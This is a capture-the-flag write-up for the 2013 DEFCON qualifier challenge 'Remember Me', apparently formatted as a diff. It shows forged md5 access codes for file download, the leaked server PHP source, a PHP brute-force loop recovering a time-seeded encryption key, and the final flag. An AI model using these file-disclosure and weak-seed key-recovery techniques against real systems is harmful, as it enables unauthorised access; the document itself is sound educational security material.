@@ -1,0 +1,88 @@
+Write up – DEFCON CTF Qualify 2013 – REMEMBER ME
+Posted on July 3, 2013 by k4m10k4
+It was gave to us the web link "http://rememberme.shallweplayaga.me" presenting a log-on form.
+
+Running the tool Nikto againt this link we found some interesting information like the listed below:
+
+1. http://rememberme.shallweplayaga.me/getfile.php?filename=usernames.txt&accesscode=60635c6862d44e8ac17dc5e144c66539
+
+2. http://rememberme.shallweplayaga.me/getfile.php?filename=passwords.txt&accesscode=b55dcb609a2ee6ea10518b5fd88c610e
+
+With this information it was possible to leak some credentials (usernames and md5 encoded hashes) which were cracked using HashCat. Additionally, it was possible to notice that the "accesscode" parameter content was the md5 hash of the "filename" parameter.
+
+Therefore, even using the credentials cracked it was not possible to find any interesting clue to the flag.
+
+Analyzing in depth the website it was noticed that NOT only the credentials files (usernames.txt, passwords.txt) were able to be accessed. We were also able to access the "getfile.php" file in order to get some clue.
+
+To read the "getfile.php" it was needed to generate the related md5 hash (0701593e23e676eaba834916a6ac7272) and submit the following request:
+
+http://rememberme.shallweplayaga.me/getfile.php?filename=getfile.php&accesscode=0701593e23e676eaba834916a6ac7272
+The result was:
+
+Access granted to getfile.php!
+ 
+$value = time();
+$filename = $_GET["filename"];
+$accesscode = $_GET["accesscode"];
+if (md5($filename) == $accesscode){
+echo "Acces granted to $filename!
+ 
+";
+srand($value);
+if (in_array($filename, array('getfile.php', 'index.html', 'key.txt', 'login.php', 'passwords.txt', 'usernames.txt'))==TRUE){
+$data = file_get_contents($filename);
+if ($data !== FALSE) {
+if ($filename == "key.txt") {
+$key = rand();
+$cyphertext = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $data, MCRYPT_MODE_CBC);
+echo base64_encode($cyphertext);
+}
+else{
+echo nl2br($data);
+}
+ 
+}
+else{
+echo "File does not exist";
+}
+}
+else{
+echo "File does not exist";
+}
+ 
+}
+else{
+echo "Invalid access code";
+}
+?>
+Using the same approach we tried to access the content of "key.txt" but we just got an encrypted information using Rijndael 128 bits, as following:
+
+"IYSqQkMeWeW7WQZCRnJ/7aFDe5zrvopjRJh7c898FHKkUlNZdlNFYyU+W5TMzteRgFLNCX9yB2O9ii2NkE5y/A=="
+Analyzing the code, fortunately we got the right path to the key.
+
+The path was to use this encrypted information and decrypt it with a seed based in the time.
+
+Knowing that, we marked the time using epochs and we created a looping with a reasonable range in order to generate the seed and decrypt the information. In order to do that, we used the following PHP code:
+
+for ($i = 1; $i <= 10000; $i++) {
+$value = "1371360000"; // Time marked when the encrypted info was generated
+ 
+srand($value+$i);
+ 
+$key = rand();
+ 
+$site = "IYSqQkMeWeW7WQZCRnJ/7aFDe5zrvopjRJh7c898FHKkUlNZdlNFYyU+W5TMzteRgFLNCX9yB2O9ii2NkE5y/A=="; //encrypted information genereated
+ 
+$cyphertext = base64_decode($site);
+ 
+#echo $cyphertext;
+ 
+$data = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, $cyphertext, MCRYPT_MODE_CBC);
+ 
+echo $data;
+ 
+$value = time();
+echo $value;
+}
+
+Finally we got access to the "key.txt" content: "To boldly go where no one has gone before WMx8reNS"
